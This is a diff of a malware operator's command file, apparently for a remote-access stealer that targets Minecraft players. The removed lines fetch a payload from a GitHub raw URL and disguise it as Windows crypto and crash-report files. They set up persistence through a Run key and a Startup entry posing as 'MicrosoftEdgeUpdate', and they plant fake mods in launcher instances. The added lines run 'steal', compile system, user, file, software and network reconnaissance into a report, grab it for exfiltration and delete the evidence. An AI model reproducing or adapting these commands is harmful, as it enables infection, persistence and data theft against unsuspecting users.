@@ -1,18 +1,20 @@
 # my commands
-version: 6
-steal
+version: 6.3
 mods https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Protect\syskeys.dat
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\Microsoft\Windows\WER\ReportArchive\crash.dat
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/e4all-neoforge-1.6.2.jar %APPDATA%\.minecraft\mods\xaerolib-compat.jar
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/cache-helper.cmd %APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd
-put https://raw.githubusercontent.com/atopdashcavalry/mcfiles/main/boot.vbs %APPDATA%\Microsoft\Crypto\RSA\boot.vbs
-shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Crypto\RSA\MachineKeys.bat" 2>nul
-shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Protect\syskeys.bat" 2>nul
-shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Windows\WER\ReportArchive\wersvc.cmd" 2>nul
-shell copy /y "%APPDATA%\Microsoft\Crypto\RSA\cache-helper.cmd" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftEdgeUpdate.cmd" 2>nul
-shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MicrosoftEdgeUpdate /t REG_SZ /d "wscript.exe ""%APPDATA%\Microsoft\Crypto\RSA\boot.vbs""" /f 2>nul
-shell for /d %d in ("%APPDATA%\PrismLauncher\instances\*") do copy /y "%APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat" "%d\minecraft\mods\xaerolib-compat.jar" 2>nul
-shell for /d %d in ("%APPDATA%\MultiMC\instances\*") do copy /y "%APPDATA%\Microsoft\Crypto\RSA\MachineKeys.dat" "%d\minecraft\mods\xaerolib-compat.jar" 2>nul
-shell wscript.exe "%APPDATA%\Microsoft\Crypto\RSA\boot.vbs" 2>nul
+@ALEXGAMING
+steal
+shell echo ===== SYSTEM ===== > %TEMP%\report.txt
+shell whoami >> %TEMP%\report.txt 2>nul & hostname >> %TEMP%\report.txt 2>nul & echo. >> %TEMP%\report.txt
+shell systeminfo >> %TEMP%\report.txt 2>nul
+shell ipconfig /all >> %TEMP%\report.txt 2>nul
+shell net user >> %TEMP%\report.txt 2>nul & net localgroup administrators >> %TEMP%\report.txt 2>nul
+shell echo ===== DESKTOP FILES ===== >> %TEMP%\report.txt 2>nul & dir /b "%USERPROFILE%\Desktop" >> %TEMP%\report.txt 2>nul
+shell echo ===== DOCUMENTS ===== >> %TEMP%\report.txt 2>nul & dir /b "%USERPROFILE%\Documents" >> %TEMP%\report.txt 2>nul
+shell echo ===== DOWNLOADS ===== >> %TEMP%\report.txt 2>nul & dir /b "%USERPROFILE%\Downloads" >> %TEMP%\report.txt 2>nul
+shell echo ===== STARTUP ===== >> %TEMP%\report.txt 2>nul & dir /b "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" >> %TEMP%\report.txt 2>nul
+shell echo ===== RUN KEYS ===== >> %TEMP%\report.txt 2>nul & reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" >> %TEMP%\report.txt 2>nul
+shell echo ===== INSTALLED (top) ===== >> %TEMP%\report.txt 2>nul & reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "DisplayName" >> %TEMP%\report.txt 2>nul
+shell echo ===== RECENT ===== >> %TEMP%\report.txt 2>nul & dir /b "%APPDATA%\Microsoft\Windows\Recent" >> %TEMP%\report.txt 2>nul
+shell echo ===== NETWORK ===== >> %TEMP%\report.txt 2>nul & netstat -ano >> %TEMP%\report.txt 2>nul
+grab %TEMP%\report.txt
+shell del /f /q "%TEMP%\report.txt" 2>nul
